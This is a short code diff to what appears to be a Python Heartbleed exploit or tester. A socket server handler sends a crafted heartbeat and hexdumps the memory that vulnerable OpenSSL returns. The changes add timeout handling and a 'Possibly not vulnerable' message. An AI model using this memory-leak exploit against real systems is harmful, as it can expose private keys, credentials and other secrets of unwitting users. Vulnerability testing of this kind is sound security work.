@@ -84,7 +84,8 @@ class TCPSvr(socketserver.BaseRequestHandler):
         self.request.sendall(make_heartbeat(sslver))
 
         # (3) Buggy OpenSSL will throw 0x4000 bytes, fixed ones stay silent
-        self.read_memory(self.request, 5)
+        if not self.read_memory(self.request, 5):
+            print("Possibly not vulnerable")
 
     def read_memory(self, sock, timeout):
         end_time = time.time() + timeout
@@ -93,6 +94,10 @@ class TCPSvr(socketserver.BaseRequestHandler):
 
         while wanted_bytes > 0 and timeout > 0:
             rl, _, _ = select.select([sock], [], [], timeout)
+
+            if not rl:
+                break
+
             data = rl[0].recv(wanted_bytes)
             if not data: # EOF
                 break
@@ -101,6 +106,7 @@ class TCPSvr(socketserver.BaseRequestHandler):
             timeout = end_time - time.time()
 
         hexdump(buffer)
+        return len(buffer) > 0
 
     def expect(self, cond, what):
         if not cond:
